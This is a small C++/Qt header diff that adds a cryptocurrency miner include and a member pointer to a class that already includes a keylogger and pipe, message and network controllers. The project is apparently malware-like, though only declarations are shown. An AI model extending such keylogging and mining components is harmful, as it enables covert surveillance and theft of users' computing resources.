@@ -6,6 +6,7 @@
 #include "KeyLogger.h"
 #include "PipeController.h"
 #include "MessageController.h"
+#include <worker/Miner.h>
 
 #include "core/EventBus.h"
 
@@ -26,6 +27,7 @@ public:
     MessageController *messageController;
     EventBus busMain;
     EventBus busNetwork;
+    Miner *miner;
     
     QString getIp() { return _ip; }
     void setIp(QString value) { _ip = value; }
